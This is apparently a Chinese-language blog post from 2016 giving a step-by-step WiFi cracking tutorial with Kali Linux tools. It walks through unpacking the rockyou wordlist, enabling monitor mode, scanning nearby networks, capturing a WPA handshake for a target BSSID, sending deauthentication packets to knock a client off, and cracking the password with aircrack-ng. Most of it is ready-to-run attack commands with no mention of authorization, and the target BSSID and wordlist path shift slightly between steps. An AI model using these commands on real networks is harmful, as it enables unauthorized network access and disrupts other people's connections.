---
title: 用 Kali-Linux 进行 Wifi 破解
date: 2016-12-20 9:43:12
tags: 
    - Wifi
    - Kali
    - 网络安全
---

<h3>1.找一个字典文件</h3>
这里用 Kali Linux 自带的`rockyou`字典，
使用前先解压。
```
gzip -d /usr/share/wordlist/rockyou.txt.gz
```

<h3>2.断开链接的WiFi</h3>
```
airmon-ng
```
列出所有支持监控模式的网卡。

<h3>3.监听网卡</h3>

```
airmon-ng start wlan0
```
此时网卡就处于监听模式，被监听的网卡变为 wlan0mon。<br>
可使用`ifconfig`命令查看。

<h3>4.查看WiFi网络</h3>
```
airodump-ng wlan0mon
```
可以看到周围WiFi的详细信息，包括信号强度、加密类型、频道(CH)等。<br>
要记住破解WIFI的频道号和BSSID。

<h3>5.抓取握手包</h3>
```
airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon
```
`6` 频道号(CH)<br>
`C8:3A....` 目标BSSID号<br>
`-w` 抓取数据包保存位置<br>

<h3>6.强制让设备重连WiFi</h3>
原理：给链接到WiFi的一个设备发送一个deauth(反认证)包，让那个设备断开WiFi，
随后它自然会再次链接。
```
aireplay-ng -0 2 -a C8:3A:35:60:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
```
`-0` 发送反认证包的个数 <br>
`-a` 指定路由器BSSID <br>
`-c` 指定强制断开的设备 <br>

成功监听到握手包后：`Ctrl+C` 结束抓包。<br>
```
airmon-ng stop wlan0mon
```
结束监听。

<h3>7.开始破解握手包密码</h3>
```
aircrack-ng -a2 -b C8:3A:35:60:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap
```
`-a2`代表握手包 <br>
`-b` 指定要破解的WiFi BSSID <br>
`-w` 指定字典文件 <br>
最后是抓取的包 <br>